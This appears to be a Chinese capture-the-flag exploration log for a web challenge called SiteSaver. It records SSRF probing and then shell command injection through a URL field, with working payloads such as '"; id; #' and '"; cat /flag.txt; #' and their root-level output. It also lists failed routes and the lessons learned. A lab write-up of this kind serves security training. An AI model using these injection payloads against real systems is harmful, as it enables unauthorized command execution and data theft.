# xben-094-24 · 探索记录

对应题解：[`xben-094-24.md`](./xben-094-24.md)

## 目标与起点

`10.0.172.218:5003`，SiteSaver：`/`（列表）、`/add_url`（表单）、`POST /delete_url/<n>`。

## 第一阶段：SSRF 与状态检查

| url | 结果 |
| --- | --- |
| `http://127.0.0.1:5003/` | `returned 200 status, Saved successfully` |
| `http://127.0.0.1:5003/flag.txt` | `Error in saving URL..`（404） |
| `http://example.com` | `Error in saving URL..`（出网失败/超时） |

判据：检查的是 HTTP 状态码，不是字符串格式。

## 第二阶段：读首页预置数据

列表里有 `http://example.com"; cat flag.txt #` —— 双引号 + `;` + `#`，
典型的「URL 被塞进双引号 shell 命令」形状。

## 第三阶段：验证与利用

| url | 结果 |
| --- | --- |
| `http://127.0.0.1:5003/"; sleep 4; #` | 4.2 s（对照 0.09 s） |
| `http://127.0.0.1:5003/"; id; #` | `returned 200uid=0(root) gid=0(root)...status` |
| `http://127.0.0.1:5003/"; cat /flag.txt; #` | **flag** |

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `http://...;id;#`（不带双引号） | 0.09s，报 Error | 没有跳出引号，整串被当成 URL |
| `POST /delete_url/1 OR 1=1` | 404 | 路由只接受 int |
| 目录扫描 | 只有 `add_url` | 其余 404 |

## 这次真正的收获

1. 「状态检查」类功能经常是 `curl "..."`，双引号上下文要用 `"` 跳出。
2. 首页/预置记录里出现奇怪字符串时，按它的形状直接复现，通常就是出题意图。
